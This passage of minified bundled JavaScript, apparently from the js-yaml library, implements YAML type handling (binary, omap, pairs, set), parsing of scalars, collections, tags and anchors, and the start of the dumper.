\r`;function hI(X){if(X===null)return!1;var J,Q,Y=0,W=X.length,z=VY;for(Q=0;Q<W;Q++){if(J=z.indexOf(X.charAt(Q)),J>64)continue;if(J<0)return!1;Y+=6}return Y%8===0}function yI(X){var J,Q,Y=X.replace(/[\r\n=]/g,""),W=Y.length,z=VY,G=0,H=[];for(J=0;J<W;J++){if(J%4===0&&J)H.push(G>>16&255),H.push(G>>8&255),H.push(G&255);G=G<<6|z.indexOf(Y.charAt(J))}if(Q=W%4*6,Q===0)H.push(G>>16&255),H.push(G>>8&255),H.push(G&255);else if(Q===18)H.push(G>>10&255),H.push(G>>2&255);else if(Q===12)H.push(G>>4&255);return new Uint8Array(H)}function mI(X){var J="",Q=0,Y,W,z=X.length,G=VY;for(Y=0;Y<z;Y++){if(Y%3===0&&Y)J+=G[Q>>18&63],J+=G[Q>>12&63],J+=G[Q>>6&63],J+=G[Q&63];Q=(Q<<8)+X[Y]}if(W=z%3,W===0)J+=G[Q>>18&63],J+=G[Q>>12&63],J+=G[Q>>6&63],J+=G[Q&63];else if(W===2)J+=G[Q>>10&63],J+=G[Q>>4&63],J+=G[Q<<2&63],J+=G[64];else if(W===1)J+=G[Q>>2&63],J+=G[Q<<4&63],J+=G[64],J+=G[64];return J}function uI(X){return Object.prototype.toString.call(X)==="[object Uint8Array]"}var cI=new F9("tag:yaml.org,2002:binary",{kind:"scalar",resolve:hI,construct:yI,predicate:uI,represent:mI}),lI=Object.prototype.hasOwnProperty,pI=Object.prototype.toString;function dI(X){if(X===null)return!0;var J=[],Q,Y,W,z,G,H=X;for(Q=0,Y=H.length;Q<Y;Q+=1){if(W=H[Q],G=!1,pI.call(W)!=="[object Object]")return!1;for(z in W)if(lI.call(W,z))if(!G)G=!0;else return!1;if(!G)return!1;if(J.indexOf(z)===-1)J.push(z);else return!1}return!0}function iI(X){return X!==null?X:[]}var rI=new F9("tag:yaml.org,2002:omap",{kind:"sequence",resolve:dI,construct:iI}),nI=Object.prototype.toString;function aI(X){if(X===null)return!0;var J,Q,Y,W,z,G=X;z=new Array(G.length);for(J=0,Q=G.length;J<Q;J+=1){if(Y=G[J],nI.call(Y)!=="[object Object]")return!1;if(W=Object.keys(Y),W.length!==1)return!1;z[J]=[W[0],Y[W[0]]]}return!0}function sI(X){if(X===null)return[];var J,Q,Y,W,z,G=X;z=new Array(G.length);for(J=0,Q=G.length;J<Q;J+=1)Y=G[J],W=Object.keys(Y),z[J]=[W[0],Y[W[0]]];return z}var oI=new F9("tag:yaml.org,2002:pairs",{kind:"sequence",resolve:aI,construct:sI}),tI=Object.prototype.hasOwnProperty;function eI(X){if(X===null)return!0;var J,Q=X;for(J in Q)if(tI.call(Q,J)){if(Q[J]!==null)return!1}return!0}function XC(X){return X!==null?X:{}}var JC=new F9("tag:yaml.org,2002:set",{kind:"mapping",resolve:eI,construct:XC}),o3=$I.extend({implicit:[xI,gI],explicit:[cI,rI,oI,JC]}),g6=Object.prototype.hasOwnProperty,hQ=1,t3=2,e3=3,yQ=4,WY=1,QC=2,b3=3,YC=/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x84\x86-\x9F\uFFFE\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF]/,WC=/[\x85\u2028\u2029]/,GC=/[,\[\]\{\}]/,XU=/^(?:!|!!|![a-z\-]+!)$/i,JU=/^(?:!|[^,\[\]\{\}])(?:%[0-9a-f]{2}|[0-9a-z\-#;\/\?:@&=\+\$,_\.!~\*'\(\)\[\]])*$/i;function v3(X){return Object.prototype.toString.call(X)}function c8(X){return X===10||X===13}function OX(X){return X===9||X===32}function y9(X){return X===9||X===32||X===10||X===13}function qJ(X){return X===44||X===91||X===93||X===123||X===125}function zC(X){var J;if(48<=X&&X<=57)return X-48;if(J=X|32,97<=J&&J<=102)return J-97+10;return-1}function HC(X){if(X===120)return 2;if(X===117)return 4;if(X===85)return 8;return 0}function UC(X){if(48<=X&&X<=57)return X-48;return-1}function x3(X){return X===48?"\x00":X===97?"\x07":X===98?"\b":X===116?"\t":X===9?"\t":X===110?`
`:X===118?"\v":X===102?"\f":X===114?"\r":X===101?"\x1B":X===32?" ":X===34?'"':X===47?"/":X===92?"\\":X===78?"":X===95?"":X===76?"\u2028":X===80?"\u2029":""}function KC(X){if(X<=65535)return String.fromCharCode(X);return String.fromCharCode((X-65536>>10)+55296,(X-65536&1023)+56320)}var QU=new Array(256),YU=new Array(256);for(x6=0;x6<256;x6++)QU[x6]=x3(x6)?1:0,YU[x6]=x3(x6);var x6;function VC(X,J){this.input=X,this.filename=J.filename||null,this.schema=J.schema||o3,this.onWarning=J.onWarning||null,this.legacy=J.legacy||!1,this.json=J.json||!1,this.listener=J.listener||null,this.implicitTypes=this.schema.compiledImplicit,this.typeMap=this.schema.compiledTypeMap,this.length=X.length,this.position=0,this.line=0,this.lineStart=0,this.lineIndent=0,this.firstTabInLine=-1,this.documents=[]}function WU(X,J){var Q={name:X.filename,buffer:X.input.slice(0,-1),position:X.position,line:X.line,column:X.position-X.lineStart};return Q.snippet=ow(Q),new h9(J,Q)}function u1(X,J){throw WU(X,J)}function mQ(X,J){if(X.onWarning)X.onWarning.call(null,WU(X,J))}var f3={YAML:function X(J,Q,Y){var W,z,G;if(J.version!==null)u1(J,"duplication of %YAML directive");if(Y.length!==1)u1(J,"YAML directive accepts exactly one argument");if(W=/^([0-9]+)\.([0-9]+)$/.exec(Y[0]),W===null)u1(J,"ill-formed argument of the YAML directive");if(z=parseInt(W[1],10),G=parseInt(W[2],10),z!==1)u1(J,"unacceptable YAML version of the document");if(J.version=Y[0],J.checkLineBreaks=G<2,G!==1&&G!==2)mQ(J,"unsupported YAML version of the document")},TAG:function X(J,Q,Y){var W,z;if(Y.length!==2)u1(J,"TAG directive accepts exactly two arguments");if(W=Y[0],z=Y[1],!XU.test(W))u1(J,"ill-formed tag handle (first argument) of the TAG directive");if(g6.call(J.tagMap,W))u1(J,'there is a previously declared suffix for "'+W+'" tag handle');if(!JU.test(z))u1(J,"ill-formed tag prefix (second argument) of the TAG directive");try{z=decodeURIComponent(z)}catch(G){u1(J,"tag prefix is malformed: "+z)}J.tagMap[W]=z}};function f6(X,J,Q,Y){var W,z,G,H;if(J<Q){if(H=X.input.slice(J,Q),Y){for(W=0,z=H.length;W<z;W+=1)if(G=H.charCodeAt(W),!(G===9||32<=G&&G<=1114111))u1(X,"expected valid JSON character")}else if(YC.test(H))u1(X,"the stream contains non-printable characters");X.result+=H}}function g3(X,J,Q,Y){var W,z,G,H;if(!W9.isObject(Q))u1(X,"cannot merge mappings; the provided source object is unacceptable");W=Object.keys(Q);for(G=0,H=W.length;G<H;G+=1)if(z=W[G],!g6.call(J,z))J[z]=Q[z],Y[z]=!0}function ZJ(X,J,Q,Y,W,z,G,H,U){var K,V;if(Array.isArray(W)){W=Array.prototype.slice.call(W);for(K=0,V=W.length;K<V;K+=1){if(Array.isArray(W[K]))u1(X,"nested arrays are not supported inside keys");if(typeof W==="object"&&v3(W[K])==="[object Object]")W[K]="[object Object]"}}if(typeof W==="object"&&v3(W)==="[object Object]")W="[object Object]";if(W=String(W),J===null)J={};if(Y==="tag:yaml.org,2002:merge")if(Array.isArray(z))for(K=0,V=z.length;K<V;K+=1)g3(X,J,z[K],Q);else g3(X,J,z,Q);else{if(!X.json&&!g6.call(Q,W)&&g6.call(J,W))X.line=G||X.line,X.lineStart=H||X.lineStart,X.position=U||X.position,u1(X,"duplicated mapping key");if(W==="__proto__")Object.defineProperty(J,W,{configurable:!0,enumerable:!0,writable:!0,value:z});else J[W]=z;delete Q[W]}return J}function BY(X){var J=X.input.charCodeAt(X.position);if(J===10)X.position++;else if(J===13){if(X.position++,X.input.charCodeAt(X.position)===10)X.position++}else u1(X,"a line break is expected");X.line+=1,X.lineStart=X.position,X.firstTabInLine=-1}function J9(X,J,Q){var Y=0,W=X.input.charCodeAt(X.position);while(W!==0){while(OX(W)){if(W===9&&X.firstTabInLine===-1)X.firstTabInLine=X.position;W=X.input.charCodeAt(++X.position)}if(J&&W===35)do W=X.input.charCodeAt(++X.position);while(W!==10&&W!==13&&W!==0);if(c8(W)){BY(X),W=X.input.charCodeAt(X.position),Y++,X.lineIndent=0;while(W===32)X.lineIndent++,W=X.input.charCodeAt(++X.position)}else break}if(Q!==-1&&Y!==0&&X.lineIndent<Q)mQ(X,"deficient indentation");return Y}function lQ(X){var J=X.position,Q;if(Q=X.input.charCodeAt(J),(Q===45||Q===46)&&Q===X.input.charCodeAt(J+1)&&Q===X.input.charCodeAt(J+2)){if(J+=3,Q=X.input.charCodeAt(J),Q===0||y9(Q))return!0}return!1}function qY(X,J){if(J===1)X.result+=" ";else if(J>1)X.result+=W9.repeat(`
`,J-1)}function BC(X,J,Q){var Y,W,z,G,H,U,K,V,B=X.kind,Z=X.result,M;if(M=X.input.charCodeAt(X.position),y9(M)||qJ(M)||M===35||M===38||M===42||M===33||M===124||M===62||M===39||M===34||M===37||M===64||M===96)return!1;if(M===63||M===45){if(W=X.input.charCodeAt(X.position+1),y9(W)||Q&&qJ(W))return!1}X.kind="scalar",X.result="",z=G=X.position,H=!1;while(M!==0){if(M===58){if(W=X.input.charCodeAt(X.position+1),y9(W)||Q&&qJ(W))break}else if(M===35){if(Y=X.input.charCodeAt(X.position-1),y9(Y))break}else if(X.position===X.lineStart&&lQ(X)||Q&&qJ(M))break;else if(c8(M))if(U=X.line,K=X.lineStart,V=X.lineIndent,J9(X,!1,-1),X.lineIndent>=J){H=!0,M=X.input.charCodeAt(X.position);continue}else{X.position=G,X.line=U,X.lineStart=K,X.lineIndent=V;break}if(H)f6(X,z,G,!1),qY(X,X.line-U),z=G=X.position,H=!1;if(!OX(M))G=X.position+1;M=X.input.charCodeAt(++X.position)}if(f6(X,z,G,!1),X.result)return!0;return X.kind=B,X.result=Z,!1}function qC(X,J){var Q,Y,W;if(Q=X.input.charCodeAt(X.position),Q!==39)return!1;X.kind="scalar",X.result="",X.position++,Y=W=X.position;while((Q=X.input.charCodeAt(X.position))!==0)if(Q===39)if(f6(X,Y,X.position,!0),Q=X.input.charCodeAt(++X.position),Q===39)Y=X.position,X.position++,W=X.position;else return!0;else if(c8(Q))f6(X,Y,W,!0),qY(X,J9(X,!1,J)),Y=W=X.position;else if(X.position===X.lineStart&&lQ(X))u1(X,"unexpected end of the document within a single quoted scalar");else X.position++,W=X.position;u1(X,"unexpected end of the stream within a single quoted scalar")}function ZC(X,J){var Q,Y,W,z,G,H;if(H=X.input.charCodeAt(X.position),H!==34)return!1;X.kind="scalar",X.result="",X.position++,Q=Y=X.position;while((H=X.input.charCodeAt(X.position))!==0)if(H===34)return f6(X,Q,X.position,!0),X.position++,!0;else if(H===92){if(f6(X,Q,X.position,!0),H=X.input.charCodeAt(++X.position),c8(H))J9(X,!1,J);else if(H<256&&QU[H])X.result+=YU[H],X.position++;else if((G=HC(H))>0){W=G,z=0;for(;W>0;W--)if(H=X.input.charCodeAt(++X.position),(G=zC(H))>=0)z=(z<<4)+G;else u1(X,"expected hexadecimal character");X.result+=KC(z),X.position++}else u1(X,"unknown escape sequence");Q=Y=X.position}else if(c8(H))f6(X,Q,Y,!0),qY(X,J9(X,!1,J)),Q=Y=X.position;else if(X.position===X.lineStart&&lQ(X))u1(X,"unexpected end of the document within a double quoted scalar");else X.position++,Y=X.position;u1(X,"unexpected end of the stream within a double quoted scalar")}function MC(X,J){var Q=!0,Y,W,z,G=X.tag,H,U=X.anchor,K,V,B,Z,M,F=Object.create(null),j,O,N,A;if(A=X.input.charCodeAt(X.position),A===91)V=93,M=!1,H=[];else if(A===123)V=125,M=!0,H={};else return!1;if(X.anchor!==null)X.anchorMap[X.anchor]=H;A=X.input.charCodeAt(++X.position);while(A!==0){if(J9(X,!0,J),A=X.input.charCodeAt(X.position),A===V)return X.position++,X.tag=G,X.anchor=U,X.kind=M?"mapping":"sequence",X.result=H,!0;else if(!Q)u1(X,"missed comma between flow collection entries");else if(A===44)u1(X,"expected the node content, but found ','");if(O=j=N=null,B=Z=!1,A===63){if(K=X.input.charCodeAt(X.position+1),y9(K))B=Z=!0,X.position++,J9(X,!0,J)}if(Y=X.line,W=X.lineStart,z=X.position,MJ(X,J,hQ,!1,!0),O=X.tag,j=X.result,J9(X,!0,J),A=X.input.charCodeAt(X.position),(Z||X.line===Y)&&A===58)B=!0,A=X.input.charCodeAt(++X.position),J9(X,!0,J),MJ(X,J,hQ,!1,!0),N=X.result;if(M)ZJ(X,H,F,O,j,N,Y,W,z);else if(B)H.push(ZJ(X,null,F,O,j,N,Y,W,z));else H.push(j);if(J9(X,!0,J),A=X.input.charCodeAt(X.position),A===44)Q=!0,A=X.input.charCodeAt(++X.position);else Q=!1}u1(X,"unexpected end of the stream within a flow collection")}function FC(X,J){var Q,Y,W=WY,z=!1,G=!1,H=J,U=0,K=!1,V,B;if(B=X.input.charCodeAt(X.position),B===124)Y=!1;else if(B===62)Y=!0;else return!1;X.kind="scalar",X.result="";while(B!==0)if(B=X.input.charCodeAt(++X.position),B===43||B===45)if(WY===W)W=B===43?b3:QC;else u1(X,"repeat of a chomping mode identifier");else if((V=UC(B))>=0)if(V===0)u1(X,"bad explicit indentation width of a block scalar; it cannot be less than one");else if(!G)H=J+V-1,G=!0;else u1(X,"repeat of an indentation width identifier");else break;if(OX(B)){do B=X.input.charCodeAt(++X.position);while(OX(B));if(B===35)do B=X.input.charCodeAt(++X.position);while(!c8(B)&&B!==0)}while(B!==0){BY(X),X.lineIndent=0,B=X.input.charCodeAt(X.position);while((!G||X.lineIndent<H)&&B===32)X.lineIndent++,B=X.input.charCodeAt(++X.position);if(!G&&X.lineIndent>H)H=X.lineIndent;if(c8(B)){U++;continue}if(X.lineIndent<H){if(W===b3)X.result+=W9.repeat(`
`,z?1+U:U);else if(W===WY){if(z)X.result+=`
`}break}if(Y)if(OX(B))K=!0,X.result+=W9.repeat(`
`,z?1+U:U);else if(K)K=!1,X.result+=W9.repeat(`
`,U+1);else if(U===0){if(z)X.result+=" "}else X.result+=W9.repeat(`
`,U);else X.result+=W9.repeat(`
`,z?1+U:U);z=!0,G=!0,U=0,Q=X.position;while(!c8(B)&&B!==0)B=X.input.charCodeAt(++X.position);f6(X,Q,X.position,!1)}return!0}function h3(X,J){var Q,Y=X.tag,W=X.anchor,z=[],G,H=!1,U;if(X.firstTabInLine!==-1)return!1;if(X.anchor!==null)X.anchorMap[X.anchor]=z;U=X.input.charCodeAt(X.position);while(U!==0){if(X.firstTabInLine!==-1)X.position=X.firstTabInLine,u1(X,"tab characters must not be used in indentation");if(U!==45)break;if(G=X.input.charCodeAt(X.position+1),!y9(G))break;if(H=!0,X.position++,J9(X,!0,-1)){if(X.lineIndent<=J){z.push(null),U=X.input.charCodeAt(X.position);continue}}if(Q=X.line,MJ(X,J,e3,!1,!0),z.push(X.result),J9(X,!0,-1),U=X.input.charCodeAt(X.position),(X.line===Q||X.lineIndent>J)&&U!==0)u1(X,"bad indentation of a sequence entry");else if(X.lineIndent<J)break}if(H)return X.tag=Y,X.anchor=W,X.kind="sequence",X.result=z,!0;return!1}function jC(X,J,Q){var Y,W,z,G,H,U,K=X.tag,V=X.anchor,B={},Z=Object.create(null),M=null,F=null,j=null,O=!1,N=!1,A;if(X.firstTabInLine!==-1)return!1;if(X.anchor!==null)X.anchorMap[X.anchor]=B;A=X.input.charCodeAt(X.position);while(A!==0){if(!O&&X.firstTabInLine!==-1)X.position=X.firstTabInLine,u1(X,"tab characters must not be used in indentation");if(Y=X.input.charCodeAt(X.position+1),z=X.line,(A===63||A===58)&&y9(Y)){if(A===63){if(O)ZJ(X,B,Z,M,F,null,G,H,U),M=F=j=null;N=!0,O=!0,W=!0}else if(O)O=!1,W=!0;else u1(X,"incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line");X.position+=1,A=Y}else{if(G=X.line,H=X.lineStart,U=X.position,!MJ(X,Q,t3,!1,!0))break;if(X.line===z){A=X.input.charCodeAt(X.position);while(OX(A))A=X.input.charCodeAt(++X.position);if(A===58){if(A=X.input.charCodeAt(++X.position),!y9(A))u1(X,"a whitespace character is expected after the key-value separator within a block mapping");if(O)ZJ(X,B,Z,M,F,null,G,H,U),M=F=j=null;N=!0,O=!1,W=!1,M=X.tag,F=X.result}else if(N)u1(X,"can not read an implicit mapping pair; a colon is missed");else return X.tag=K,X.anchor=V,!0}else if(N)u1(X,"can not read a block mapping entry; a multiline key may not be an implicit key");else return X.tag=K,X.anchor=V,!0}if(X.line===z||X.lineIndent>J){if(O)G=X.line,H=X.lineStart,U=X.position;if(MJ(X,J,yQ,!0,W))if(O)F=X.result;else j=X.result;if(!O)ZJ(X,B,Z,M,F,j,G,H,U),M=F=j=null;J9(X,!0,-1),A=X.input.charCodeAt(X.position)}if((X.line===z||X.lineIndent>J)&&A!==0)u1(X,"bad indentation of a mapping entry");else if(X.lineIndent<J)break}if(O)ZJ(X,B,Z,M,F,null,G,H,U);if(N)X.tag=K,X.anchor=V,X.kind="mapping",X.result=B;return N}function OC(X){var J,Q=!1,Y=!1,W,z,G;if(G=X.input.charCodeAt(X.position),G!==33)return!1;if(X.tag!==null)u1(X,"duplication of a tag property");if(G=X.input.charCodeAt(++X.position),G===60)Q=!0,G=X.input.charCodeAt(++X.position);else if(G===33)Y=!0,W="!!",G=X.input.charCodeAt(++X.position);else W="!";if(J=X.position,Q){do G=X.input.charCodeAt(++X.position);while(G!==0&&G!==62);if(X.position<X.length)z=X.input.slice(J,X.position),G=X.input.charCodeAt(++X.position);else u1(X,"unexpected end of the stream within a verbatim tag")}else{while(G!==0&&!y9(G)){if(G===33)if(!Y){if(W=X.input.slice(J-1,X.position+1),!XU.test(W))u1(X,"named tag handle cannot contain such characters");Y=!0,J=X.position+1}else u1(X,"tag suffix cannot contain exclamation marks");G=X.input.charCodeAt(++X.position)}if(z=X.input.slice(J,X.position),GC.test(z))u1(X,"tag suffix cannot contain flow indicator characters")}if(z&&!JU.test(z))u1(X,"tag name cannot contain such characters: "+z);try{z=decodeURIComponent(z)}catch(H){u1(X,"tag name is malformed: "+z)}if(Q)X.tag=z;else if(g6.call(X.tagMap,W))X.tag=X.tagMap[W]+z;else if(W==="!")X.tag="!"+z;else if(W==="!!")X.tag="tag:yaml.org,2002:"+z;else u1(X,'undeclared tag handle "'+W+'"');return!0}function RC(X){var J,Q;if(Q=X.input.charCodeAt(X.position),Q!==38)return!1;if(X.anchor!==null)u1(X,"duplication of an anchor property");Q=X.input.charCodeAt(++X.position),J=X.position;while(Q!==0&&!y9(Q)&&!qJ(Q))Q=X.input.charCodeAt(++X.position);if(X.position===J)u1(X,"name of an anchor node must contain at least one character");return X.anchor=X.input.slice(J,X.position),!0}function AC(X){var J,Q,Y;if(Y=X.input.charCodeAt(X.position),Y!==42)return!1;Y=X.input.charCodeAt(++X.position),J=X.position;while(Y!==0&&!y9(Y)&&!qJ(Y))Y=X.input.charCodeAt(++X.position);if(X.position===J)u1(X,"name of an alias node must contain at least one character");if(Q=X.input.slice(J,X.position),!g6.call(X.anchorMap,Q))u1(X,'unidentified alias "'+Q+'"');return X.result=X.anchorMap[Q],J9(X,!0,-1),!0}function MJ(X,J,Q,Y,W){var z,G,H,U=1,K=!1,V=!1,B,Z,M,F,j,O;if(X.listener!==null)X.listener("open",X);if(X.tag=null,X.anchor=null,X.kind=null,X.result=null,z=G=H=yQ===Q||e3===Q,Y){if(J9(X,!0,-1)){if(K=!0,X.lineIndent>J)U=1;else if(X.lineIndent===J)U=0;else if(X.lineIndent<J)U=-1}}if(U===1)while(OC(X)||RC(X))if(J9(X,!0,-1)){if(K=!0,H=z,X.lineIndent>J)U=1;else if(X.lineIndent===J)U=0;else if(X.lineIndent<J)U=-1}else H=!1;if(H)H=K||W;if(U===1||yQ===Q){if(hQ===Q||t3===Q)j=J;else j=J+1;if(O=X.position-X.lineStart,U===1)if(H&&(h3(X,O)||jC(X,O,j))||MC(X,j))V=!0;else{if(G&&FC(X,j)||qC(X,j)||ZC(X,j))V=!0;else if(AC(X)){if(V=!0,X.tag!==null||X.anchor!==null)u1(X,"alias node should not have any properties")}else if(BC(X,j,hQ===Q)){if(V=!0,X.tag===null)X.tag="?"}if(X.anchor!==null)X.anchorMap[X.anchor]=X.result}else if(U===0)V=H&&h3(X,O)}if(X.tag===null){if(X.anchor!==null)X.anchorMap[X.anchor]=X.result}else if(X.tag==="?"){if(X.result!==null&&X.kind!=="scalar")u1(X,'unacceptable node kind for !<?> tag; it should be "scalar", not "'+X.kind+'"');for(B=0,Z=X.implicitTypes.length;B<Z;B+=1)if(F=X.implicitTypes[B],F.resolve(X.result)){if(X.result=F.construct(X.result),X.tag=F.tag,X.anchor!==null)X.anchorMap[X.anchor]=X.result;break}}else if(X.tag!=="!"){if(g6.call(X.typeMap[X.kind||"fallback"],X.tag))F=X.typeMap[X.kind||"fallback"][X.tag];else{F=null,M=X.typeMap.multi[X.kind||"fallback"];for(B=0,Z=M.length;B<Z;B+=1)if(X.tag.slice(0,M[B].tag.length)===M[B].tag){F=M[B];break}}if(!F)u1(X,"unknown tag !<"+X.tag+">");if(X.result!==null&&F.kind!==X.kind)u1(X,"unacceptable node kind for !<"+X.tag+'> tag; it should be "'+F.kind+'", not "'+X.kind+'"');if(!F.resolve(X.result,X.tag))u1(X,"cannot resolve a node with !<"+X.tag+"> explicit tag");else if(X.result=F.construct(X.result,X.tag),X.anchor!==null)X.anchorMap[X.anchor]=X.result}if(X.listener!==null)X.listener("close",X);return X.tag!==null||X.anchor!==null||V}function NC(X){var J=X.position,Q,Y,W,z=!1,G;X.version=null,X.checkLineBreaks=X.legacy,X.tagMap=Object.create(null),X.anchorMap=Object.create(null);while((G=X.input.charCodeAt(X.position))!==0){if(J9(X,!0,-1),G=X.input.charCodeAt(X.position),X.lineIndent>0||G!==37)break;z=!0,G=X.input.charCodeAt(++X.position),Q=X.position;while(G!==0&&!y9(G))G=X.input.charCodeAt(++X.position);if(Y=X.input.slice(Q,X.position),W=[],Y.length<1)u1(X,"directive name must not be less than one character in length");while(G!==0){while(OX(G))G=X.input.charCodeAt(++X.position);if(G===35){do G=X.input.charCodeAt(++X.position);while(G!==0&&!c8(G));break}if(c8(G))break;Q=X.position;while(G!==0&&!y9(G))G=X.input.charCodeAt(++X.position);W.push(X.input.slice(Q,X.position))}if(G!==0)BY(X);if(g6.call(f3,Y))f3[Y](X,Y,W);else mQ(X,'unknown document directive "'+Y+'"')}if(J9(X,!0,-1),X.lineIndent===0&&X.input.charCodeAt(X.position)===45&&X.input.charCodeAt(X.position+1)===45&&X.input.charCodeAt(X.position+2)===45)X.position+=3,J9(X,!0,-1);else if(z)u1(X,"directives end mark is expected");if(MJ(X,X.lineIndent-1,yQ,!1,!0),J9(X,!0,-1),X.checkLineBreaks&&WC.test(X.input.slice(J,X.position)))mQ(X,"non-ASCII line breaks are interpreted as content");if(X.documents.push(X.result),X.position===X.lineStart&&lQ(X)){if(X.input.charCodeAt(X.position)===46)X.position+=3,J9(X,!0,-1);return}if(X.position<X.length-1)u1(X,"end of the stream or a document separator is expected");else return}function GU(X,J){if(X=String(X),J=J||{},X.length!==0){if(X.charCodeAt(X.length-1)!==10&&X.charCodeAt(X.length-1)!==13)X+=`
`;if(X.charCodeAt(0)===65279)X=X.slice(1)}var Q=new VC(X,J),Y=X.indexOf("\x00");if(Y!==-1)Q.position=Y,u1(Q,"null byte is not allowed in input");Q.input+="\x00";while(Q.input.charCodeAt(Q.position)===32)Q.lineIndent+=1,Q.position+=1;while(Q.position<Q.length-1)NC(Q);return Q.documents}function LC(X,J,Q){if(J!==null&&typeof J==="object"&&typeof Q==="undefined")Q=J,J=null;var Y=GU(X,Q);if(typeof J!=="function")return Y;for(var W=0,z=Y.length;W<z;W+=1)J(Y[W])}function DC(X,J){var Q=GU(X,J);if(Q.length===0)return;else if(Q.length===1)return Q[0];throw new h9("expected a single document in the stream, but found more")}var wC=LC,IC=DC,zU={loadAll:wC,load:IC},HU=Object.prototype.toString,UU=Object.prototype.hasOwnProperty,ZY=65279,CC=9,s7=10,PC=13,SC=32,TC=33,_C=34,zY=35,EC=37,$C=38,kC=39,bC=42,KU=44,vC=45,uQ=58,xC=61,fC=62,gC=63,hC=64,VU=91,BU=93,yC=96,qU=123,mC=124,ZU=125,j9={};j9[0]="\\0";j9[7]="\\a";j9[8]="\\b";j9[9]="\\t";j9[10]="\\n";j9[11]="\\v";j9[12]="\\f";j9[13]="\\r";j9[27]="\\e";j9[34]="\\\"";j9[92]="\\\\";j9[133]="\\N";j9[160]="\\_";j9[8232]="\\L";j9[8233]="\\P";var uC=["y","Y","yes","Yes","YES","on","On","ON","n","N","no","No","NO","off","Off","OFF"],cC=/^[-+]?[0-9_]+(?::[0-9_]+)+(?:\.[0-9_]*)?$/;function lC(X,J){var Q,Y,W,z,G,H,U;if(J===null)return{};Q={},Y=Object.keys(J);for(W=0,z=Y.length;W<z;W+=1){if(G=Y[W],H=String(J[G]),G.slice(0,2)==="!!")G="tag:yaml.org,2002:"+G.slice(2);if(U=X.compiledTypeMap.fallback[G],U&&UU.call(U.styleAliases,H))H=U.styleAliases[H];Q[G]=H}return Q}function pC(X){var J,Q,Y;if(J=X.toString(16).toUpperCase(),X<=255)Q="x",Y=2;else if(X<=65535)Q="u",Y=4;else if(X<=4294967295)Q="U",Y=8;else throw new h9("code point within a string may not be greater than 0xFFFFFFFF");return"\\"+Q+W9.repeat("0",Y-J.length)+J}var dC=1,o7=2;function iC(X){this.schema=X.schema||o3,this.indent=Math.max(1,X.indent||2),this.noArrayIndent=X.noArrayIndent||!1,this.skipInvalid=X.skipInvalid||!1,this.flowLevel=W9.isNothing(X.flowLevel)?-1:X.flowLevel,this.styleMap=lC(this.schema,X.styles||null),this.sortKeys=X.sortKeys||!1,this.lineWidth=X.lineWidth||80,this.noRefs=X.noRefs||!1,this.noCompatMode=X.noCompatMode||!1,this.condenseFlow=X.condenseFlow||!1,this.quotingType=X.quotingType==='"'?o7:dC,this.forceQuotes=X.forceQuotes||!1,this.replacer=typeof X.replacer==="function"?X.replacer:null,this.implicitTypes=this.schema.compiledImplicit,this.explicitTypes=this.schema.compiledExplicit,this.tag=null,this.result="",this.duplicates=[],this.usedDuplicates=null}function y3(X,J){var Q=W9.repeat(" ",J),Y=0,W=-1,z="",G,H=X.length;while(Y<H){if(W=X.indexOf(`
`,Y),W===-1)G=X.slice(Y),Y=H;else G=X.slice(Y,W+1),Y=W+1;if(G.length&&G!==`
`)z+=Q;z+=G}return z}function HY(X,J){return`
`+W9.repeat(" ",X.indent*J)}function rC(X,J){var Q,Y,W;for(Q=0,Y=X.implicitTypes.length;Q<Y;Q+=1)if(W=X.implicitTypes[Q],W.resolve(J))return!0;return!1}function cQ(X){return X===SC||X===CC}function t7(X){return 32<=X&&X<=126||161<=X&&X<=55295&&X!==8232&&X!==8233||57344<=X&&X<=65533&&X!==ZY||65536<=X&&X<=1114111}function m3(X){return t7(X)&&X!==ZY&&X!==PC&&X!==s7}function u3(X,J,Q){var Y=m3(X),W=Y&&!cQ(X);return(Q?Y:Y&&X!==KU&&X!==VU&&X!==BU&&X!==qU&&X!==ZU)&&X!==zY&&!(J===uQ&&!W)||m3(J)&&!cQ(J)&&X===zY||J===uQ&&W}function nC(X){return t7(X)&&X!==ZY&&!cQ(X)&&X!==vC&&X!==gC&&X!==uQ&&X!==KU&&X!==VU&&X!==BU&&X!==qU&&X!==ZU&&X!==zY&&X!==$C&&X!==bC&&X!==TC&&X!==mC&&X!==xC&&X!==fC&&X!==kC&&X!==_C&&X!==EC&&X!==hC&&X!==yC}function aC(X){return!cQ(X)&&X!==uQ}function n7(X,J){var Q=X.charCodeAt(J),Y;if(Q>=55296&&Q<=56319&&J+1<X.length){if(Y=X.charCodeAt(J+1),Y>=56320&&Y<=57343)return(Q-55296)*1024+Y-56320+65536}return Q}function MU(X){var J=/^\n* /;return J.test(X)}var FU=1,UY=2,jU=3,OU=4,BJ=5;function sC(X,J,Q,Y,W,z,G,H){var U,K=0,V=null,B=!1,Z=!1,M=Y!==-1,F=-1,j=nC(n7(X,0))&&aC(n7(X,X.length-1));if(J||G)for(U=0;U<X.length;K>=65536?U+=2:U++){if(K=n7(X,U),!t7(K))return BJ;j=j&&u3(K,V,H),V=K}else{for(U=0;U<X.length;K>=65536?U+=2:U++){if(K=n7(X,U),K===s7){if(B=!0,M)Z=Z||U-F-1>Y&&X[F+1]!==" ",F=U}else if(!t7(K))return BJ;j=j&&u3(K,V,H),V=K}Z=Z||M&&(U-F-1>Y&&X[F+1]!==" ")}if(!B&&!Z){if(j&&!G&&!W(X))return FU;return z===o7?BJ:UY}if(Q>9&&MU(X))return BJ;if(!G)return Z?OU:jU;return z===o7?BJ:UY}function oC(X,J,Q,Y,W){X.dump=function(){if(J.length===0)return X.quotingType===o7?'""':"''";if(!X.noCompatMode){if(uC.indexOf(J)!==-1||cC.test(J))return X.quotingType===o7?'"'+J+'"':"'"+J+"'"}var z=X.indent*Math.max(1,Q),G=X.lineWidth===-1?-1:Math.max(Math.min(X.lineWidth,40),X.lineWidth-z),H=Y||X.flowLevel>-1&&Q>=X.flowLevel;function U(K){return rC(X,K)}switch(sC(J,H,X.indent,G,U,X.quotingType,X.forceQuotes&&!Y,W)){case FU:return J;case UY:return"'"+J.replace(/'/g,"''")+"'";case jU:return"|"+c3(J,X.indent)+l3(y3(J,z));case OU:return">"+c3(J,X.indent)+l3(y3(tC(J,G),z));case BJ:return'"'+eC(J)+'"';default:throw new h9("impossible error: invalid scalar style")}}()}function c3(X,J){var Q=MU(X)?String(J):"",Y=X[X.length-1]===`
